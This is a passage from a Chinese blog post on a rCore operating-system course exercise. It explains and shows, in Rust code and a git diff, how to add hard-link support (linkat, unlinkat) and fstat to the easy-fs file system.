keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> inode <span class="token operator">=</span> inode<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> is_zero_link <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    inode<span class="token punctuation">.</span><span class="token function">modify_disk_inode</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>dinode<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>        dinode<span class="token punctuation">.</span>nlink <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> dinode<span class="token punctuation">.</span>nlink <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>            is_zero_link <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Test will timeout with the code below, what the fuck??</span>    <span class="token comment">// Free memory of inode and file data</span>    <span class="token keyword">if</span> is_zero_link <span class="token punctuation">&#123;</span>        inode<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> res <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">modify_disk_inode</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>dinode<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Remove(For simplisity, not remove, just set to empty)</span>        <span class="token comment">// the directory entry with name in the ROOT_DIR</span>        <span class="token keyword">let</span> fcnt <span class="token operator">=</span> <span class="token punctuation">(</span>dinode<span class="token punctuation">.</span>size <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token constant">DIRENT_SZ</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>fcnt <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> <span class="token keyword">mut</span> dirent <span class="token operator">=</span> <span class="token class-name">DirEntry</span><span class="token punctuation">::</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>                dinode<span class="token punctuation">.</span><span class="token function">read_at</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token constant">DIRENT_SZ</span><span class="token punctuation">,</span> dirent<span class="token punctuation">.</span><span class="token function">as_bytes_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>block_device<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token constant">DIRENT_SZ</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> dirent<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> name <span class="token punctuation">&#123;</span>                dirent <span class="token operator">=</span> <span class="token class-name">DirEntry</span><span class="token punctuation">::</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dinode<span class="token punctuation">.</span><span class="token function">write_at</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token constant">DIRENT_SZ</span><span class="token punctuation">,</span> dirent<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>block_device<span class="token punctuation">)</span><span class="token punctuation">;</span>                res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">&#125;</span></code></pre><h3 id="fstat"><a href="#fstat" class="headerlink" title="fstat"></a>fstat</h3><p>第三个需要实现的是获取文件状态的 <code>fstat</code>，相较于 <code>linkat</code> 和 <code>unlinkat</code> 来说要复杂一些。</p><p>首先要解决的问题是：如何根据文件描述符 <code>fd</code> 获取其对应的 <code>Inode</code> 结构？这里必须要明确一个概念，所谓文件描述符，本质上只是一个无符号整型，其值为对应文件在当前进程文件描述符表中的 <strong>索引</strong> 。文件描述符表的元素为一个 trait 对象（在其他面向对象语言中相当于虚基类）<code>dyn File</code>，它表示一个抽象的“文件”实体。该“虚基类”有三种具体实现：标准输入 <code>Stdin</code>、标准输出 <code>Stdout</code> 和普通文件 <code>OSInode</code>，我们需要关注的便是 <code>OSInode</code> 的实现。</p><p>一种直接的想法是直接对 <code>OSInode</code> 数据结构进行扩展，为其实现 <code>fstat</code> 操作。但是请注意，文件描述符表的元素类型为虚基类 <code>File</code>，因此它无法直接调用其“派生类” <code>OSInode</code> 中所实现的方法，因此在这里我选择为 <code>File</code> 这个 trait 添加 <code>get_stat</code> 方法，并在 <code>OSInode</code> 中对其进行具体实现（<code>Stdin</code> 和 <code>Stdout</code> 也要实现，可以选择加一个 <code>panic!(&quot;Not implemented!&quot;);</code> 进行占位）。</p><blockquote><p>我对 Rust 还不太了解，不过我推测这里应该可以使用类似 C++ 中的动态类型转换 <code>dynamic_cast</code> 将 <code>dyn File</code> 类型转换为 <code>OSInode</code>，请读者批评指正。</p></blockquote><p>构建起文件描述符到 <code>Inode</code> 的接口后，便可以开始具体实现 <code>fstat</code> 了，需要获取三个文件状态：inode_id、文件类型（普通文件或目录）、硬链接数量。接下来分别介绍：</p><p>首先是 inode_id，在 rCore 的文件系统实现中，inode_id（索引结点号）和文件描述符类似，也是 <strong>索引</strong> ，指向其对应的 <code>DiskInode</code> 在 inode 位图中的位置。因此我们可以通过 <code>Inode</code> 结构中的 <code>block_id</code> 和 <code>block_offset</code> 将 inode_id 计算出来，计算方式如下：</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Get inode id based upon block id and block offset</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">get_ino</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> block_id<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> block_offset<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">usize</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> inode_size <span class="token operator">=</span> <span class="token function">size_of</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token class-name">DiskInode</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> inode_cnt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token constant">BLOCK_SZ</span> <span class="token operator">/</span> inode_size<span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span>block_id <span class="token operator">-</span> <span class="token keyword">self</span><span class="token punctuation">.</span>inode_area_start_block <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token operator">*</span> inode_cnt <span class="token operator">+</span> block_offset <span class="token operator">/</span> inode_size<span class="token punctuation">&#125;</span></code></pre><p>文件类型和硬链接数量的获取比较简单，可以通过使用 <code>read_disk_inode</code> 获取 <code>inode</code> 对应的 <code>DiskInode</code> 的只读引用，并从中读取相关信息即可。</p><h3 id="前向兼容"><a href="#前向兼容" class="headerlink" title="前向兼容"></a>前向兼容</h3><p>前向兼容可以借助 <code>git cherry-pick</code> 命令将其他分支的提交移植到当前分支，有关它的具体用法，可以参考我写的 Chapter5 练习中的介绍。</p><p>需要非常注意的一点是，<code>spawn</code> 系统调用移植后，需要添加 <strong>拷贝父进程文件描述符表</strong> 的操作，否则可能就会导致测试程序无法被正常加载（本章测试进程使用 <code>spawn</code> 系统调用进行创建）。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/easy-fs/src/efs.rs b/easy-fs/src/efs.rsindex 202b9eb..52828c2 100644<span class="token coord">--- a/easy-fs/src/efs.rs</span><span class="token coord">+++ b/easy-fs/src/efs.rs</span><span class="token coord">@@ -1,3 +1,5 @@</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    block_cache_sync_all, get_block_cache, Bitmap, BlockDevice, DiskInode, DiskInodeType, Inode,</span><span class="token prefix unchanged"> </span><span class="token line">    SuperBlock,</span></span>@@ -148,4 +150,11 @@ impl EasyFileSystem &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            (block_id - self.data_area_start_block) as usize,</span><span class="token prefix unchanged"> </span><span class="token line">        )</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Get inode id based upon block id and block offset</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_ino(&amp;self, block_id: usize, block_offset: usize) -> usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inode_size = size_of::&lt;DiskInode>();</span><span class="token prefix inserted">+</span><span class="token line">        let inode_cnt = (BLOCK_SZ / inode_size) as usize;</span><span class="token prefix inserted">+</span><span class="token line">        (block_id - self.inode_area_start_block as usize) * inode_cnt + block_offset / inode_size</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/easy-fs/src/layout.rs b/easy-fs/src/layout.rsindex 0a3ac79..692f5e7 100644<span class="token coord">--- a/easy-fs/src/layout.rs</span><span class="token coord">+++ b/easy-fs/src/layout.rs</span>@@ -70,7 +70,9 @@ impl SuperBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// Type of a disk inode</span><span class="token prefix unchanged"> </span><span class="token line">#[derive(PartialEq)]</span><span class="token prefix unchanged"> </span><span class="token line">pub enum DiskInodeType &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// file type</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    File,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// directory type</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    Directory,</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -86,6 +88,7 @@ pub struct DiskInode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub indirect1: u32,</span><span class="token prefix unchanged"> </span><span class="token line">    pub indirect2: u32,</span><span class="token prefix unchanged"> </span><span class="token line">    type_: DiskInodeType,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    pub nlink: u32,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl DiskInode &#123;</span></span>@@ -97,6 +100,7 @@ impl DiskInode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        self.indirect1 = 0;</span><span class="token prefix unchanged"> </span><span class="token line">        self.indirect2 = 0;</span><span class="token prefix unchanged"> </span><span class="token line">        self.type_ = type_;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        self.nlink = 1;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    /// Whether this inode is a directory</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn is_dir(&amp;self) -> bool &#123;</span></span>diff --git a/easy-fs/src/lib.rs b/easy-fs/src/lib.rsindex 822c237..d146f19 100644<span class="token coord">--- a/easy-fs/src/lib.rs</span><span class="token coord">+++ b/easy-fs/src/lib.rs</span>@@ -16,3 +16,4 @@ pub use block_dev::BlockDevice;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use efs::EasyFileSystem;</span><span class="token prefix unchanged"> </span><span class="token line">use layout::*;</span><span class="token prefix unchanged"> </span><span class="token line">pub use vfs::Inode;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use layout::DiskInodeType;</span></span>\ No newline at end of filediff --git a/easy-fs/src/vfs.rs b/easy-fs/src/vfs.rsindex 9908385..cb56ad9 100644<span class="token coord">--- a/easy-fs/src/vfs.rs</span><span class="token coord">+++ b/easy-fs/src/vfs.rs</span>@@ -183,4 +183,93 @@ impl Inode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;);</span><span class="token prefix unchanged"> </span><span class="token line">        block_cache_sync_all();</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Create a hard link with new_name for file with old_name</span><span class="token prefix inserted">+</span><span class="token line">    pub fn linkat(&amp;self, old_name: &amp;str, new_name: &amp;str) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        // get inode of file with old_name</span><span class="token prefix inserted">+</span><span class="token line">        let inode = self.find(old_name);</span><span class="token prefix inserted">+</span><span class="token line">        if inode.is_none() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return -1;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let inode = inode.unwrap();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        let mut id = 0;         // inode id</span><span class="token prefix inserted">+</span><span class="token line">        let mut offset = 0;     // last position of data of inode</span><span class="token prefix inserted">+</span><span class="token line">        self.read_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            id = self.find_inode_id(old_name, dinode).unwrap();</span><span class="token prefix inserted">+</span><span class="token line">            offset = dinode.size as usize;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        inode.modify_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            dinode.nlink += 1;  // increase reference count</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        let new_entry = DirEntry::new(new_name, id);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // insert a new directory entry into ROOT_DIR</span><span class="token prefix inserted">+</span><span class="token line">        self.write_at(offset, new_entry.as_bytes());</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Remove a hard link with name</span><span class="token prefix inserted">+</span><span class="token line">    pub fn unlinkat(&amp;self, name: &amp;str) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        // get inode of file with name</span><span class="token prefix inserted">+</span><span class="token line">        let inode = self.find(name);</span><span class="token prefix inserted">+</span><span class="token line">        if inode.is_none() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return -1;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let inode = inode.unwrap();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        let mut is_zero_link = false;</span><span class="token prefix inserted">+</span><span class="token line">        inode.modify_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            dinode.nlink -= 1;</span><span class="token prefix inserted">+</span><span class="token line">            if dinode.nlink == 0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">                is_zero_link = true;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        // Test will timeout with the code below, what the fuck??</span><span class="token prefix inserted">+</span><span class="token line">        // Free memory of inode and file data</span><span class="token prefix inserted">+</span><span class="token line">        // if is_zero_link &#123;</span><span class="token prefix inserted">+</span><span class="token line">        //     inode.clear();</span><span class="token prefix inserted">+</span><span class="token line">        // &#125;</span><span class="token prefix inserted">+</span><span class="token line">        </span><span class="token prefix inserted">+</span><span class="token line">        let mut res = -1;</span><span class="token prefix inserted">+</span><span class="token line">        self.modify_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            // Remove(For simplisity, not remove, just set to empty) </span><span class="token prefix inserted">+</span><span class="token line">            // the directory entry with name in the ROOT_DIR</span><span class="token prefix inserted">+</span><span class="token line">            let fcnt = (dinode.size as usize) / DIRENT_SZ;</span><span class="token prefix inserted">+</span><span class="token line">            for i in 0..fcnt &#123;</span><span class="token prefix inserted">+</span><span class="token line">                let mut dirent = DirEntry::empty();</span><span class="token prefix inserted">+</span><span class="token line">                assert_eq!(</span><span class="token prefix inserted">+</span><span class="token line">                    dinode.read_at(i * DIRENT_SZ, dirent.as_bytes_mut(), &amp;self.block_device),</span><span class="token prefix inserted">+</span><span class="token line">                    DIRENT_SZ</span><span class="token prefix inserted">+</span><span class="token line">                );</span><span class="token prefix inserted">+</span><span class="token line">                if dirent.name() == name &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    dirent = DirEntry::empty();</span><span class="token prefix inserted">+</span><span class="token line">                    dinode.write_at(i * DIRENT_SZ, dirent.as_bytes(), &amp;self.block_device);</span><span class="token prefix inserted">+</span><span class="token line">                    res = 0;</span><span class="token prefix inserted">+</span><span class="token line">                    break;</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        res</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get nlink of the inode</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_nlink(&amp;self) -> u32 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut nlink = 0;</span><span class="token prefix inserted">+</span><span class="token line">        self.read_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            nlink = dinode.nlink;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        nlink</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get file type of the inode</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_file_type(&amp;self) -> DiskInodeType &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut ftype = DiskInodeType::File;</span><span class="token prefix inserted">+</span><span class="token line">        self.read_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if dinode.is_dir() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                ftype = DiskInodeType::Directory;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        ftype</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get inode number of the inode</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_ino(&amp;self) -> u32 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let fs = self.fs.lock();</span><span class="token prefix inserted">+</span><span class="token line">        fs.get_ino(self.block_id, self.block_offset) as u32</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token coord">--- a/os/src/config.rs</span><span class="token coord">+++ b/os/src/config.rs</span>@@ -25,3 +25,5 @@ pub const CLOCK_FREQ: usize = 12500000;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub const MEMORY_END: usize = 0x88000000;</span><span class="token prefix unchanged"> </span><span class="token line">/// The base address of control registers in Virtio_Block device</span><span class="token prefix unchanged"> </span><span class="token line">pub const MMIO: &amp;[(usize, usize)] = &amp;[(0x10001000, 0x1000)];</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">/// big constant for process scheduling</span><span class="token prefix inserted">+</span><span class="token line">pub const BIG_STRIDE: isize = 1000_000;</span></span>diff --git a/os/src/fs/inode.rs b/os/src/fs/inode.rsindex 3f1f208..7c63086 100644<span class="token coord">--- a/os/src/fs/inode.rs</span><span class="token coord">+++ b/os/src/fs/inode.rs</span><span class="token coord">@@ -4,14 +4,14 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//!</span><span class="token prefix unchanged"> </span><span class="token line">//! `UPSafeCell&lt;OSInodeInner>` -> `OSInode`: for static `ROOT_INODE`,we</span><span class="token prefix unchanged"> </span><span class="token line">//! need to wrap `OSInodeInner` into `UPSafeCell`</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use super::File;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use super::&#123;File, Stat, StatMode&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::drivers::BLOCK_DEVICE;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::mm::UserBuffer;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span><span class="token prefix unchanged"> </span><span class="token line">use bitflags::*;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use easy_fs::&#123;EasyFileSystem, Inode&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use easy_fs::&#123;DiskInodeType, EasyFileSystem, Inode&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use lazy_static::*;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// inode in memory</span></span>@@ -55,6 +55,7 @@ impl OSInode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">lazy_static! &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// The inode of root directory</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub static ref ROOT_INODE: Arc&lt;Inode> = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        let efs = EasyFileSystem::open(BLOCK_DEVICE.clone());</span><span class="token prefix unchanged"> </span><span class="token line">        Arc::new(EasyFileSystem::root_inode(&amp;efs))</span></span>@@ -155,4 +156,15 @@ impl File for OSInode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token prefix unchanged"> </span><span class="token line">        total_write_size</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    fn get_stat(&amp;self) -> Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let ino = inner.inode.get_ino() as u64;</span><span class="token prefix inserted">+</span><span class="token line">        let mode = match inner.inode.get_file_type() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            DiskInodeType::File => StatMode::FILE,</span><span class="token prefix inserted">+</span><span class="token line">            DiskInodeType::Directory => StatMode::DIR,</span><span class="token prefix inserted">+</span><span class="token line">        &#125;;</span><span class="token prefix inserted">+</span><span class="token line">        let nlink = inner.inode.get_nlink();</span><span class="token prefix inserted">+</span><span class="token line">        Stat::new(ino, mode, nlink)</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/fs/mod.rs b/os/src/fs/mod.rsindex 4c99179..522eb4f 100644<span class="token coord">--- a/os/src/fs/mod.rs</span><span class="token coord">+++ b/os/src/fs/mod.rs</span>@@ -15,6 +15,8 @@ pub trait File: Send + Sync &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    fn read(&amp;self, buf: UserBuffer) -> usize;</span><span class="token prefix unchanged"> </span><span class="token line">    /// write to the file from buf, return the number of bytes written</span><span class="token prefix unchanged"> </span><span class="token line">    fn write(&amp;self, buf: UserBuffer) -> usize;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// get Stat of the inode</span><span class="token prefix inserted">+</span><span class="token line">    fn get_stat(&amp;self) -> Stat;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// The stat of a inode</span></span>@@ -33,6 +35,19 @@ pub struct Stat &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pad: [u64; 7],</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">impl Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">    /// Create a new Stat with default dev and pad</span><span class="token prefix inserted">+</span><span class="token line">    pub fn new(ino: u64, mode: StatMode, nlink: u32) -> Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">        Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">            dev: 0,</span><span class="token prefix inserted">+</span><span class="token line">            ino,</span><span class="token prefix inserted">+</span><span class="token line">            mode,</span><span class="token prefix inserted">+</span><span class="token line">            nlink,</span><span class="token prefix inserted">+</span><span class="token line">            pad: [0; 7],</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">bitflags! &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    /// The mode of a inode</span><span class="token prefix unchanged"> </span><span class="token line">    /// whether a directory or a file</span></span>@@ -46,5 +61,5 @@ bitflags! &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">pub use inode::&#123;list_apps, open_file, OSInode, OpenFlags&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use inode::&#123;list_apps, open_file, OSInode, OpenFlags, ROOT_INODE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use stdio::&#123;Stdin, Stdout&#125;;</span></span>diff --git a/os/src/fs/stdio.rs b/os/src/fs/stdio.rsindex 6075a65..8b5c36f 100644<span class="token coord">--- a/os/src/fs/stdio.rs</span><span class="token coord">+++ b/os/src/fs/stdio.rs</span><span class="token coord">@@ -1,5 +1,5 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//!Stdin &amp; Stdout</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use super::File;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use super::&#123;File, Stat&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::mm::UserBuffer;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::sbi::console_getchar;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::task::suspend_current_and_run_next;</span></span>@@ -39,6 +39,9 @@ impl File for Stdin &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    fn write(&amp;self, _user_buf: UserBuffer) -> usize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        panic!("Cannot write to stdin!");</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    fn get_stat(&amp;self) -> Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">        panic!("Not implemented!");</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl File for Stdout &#123;</span></span>@@ -57,4 +60,7 @@ impl File for Stdout &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token 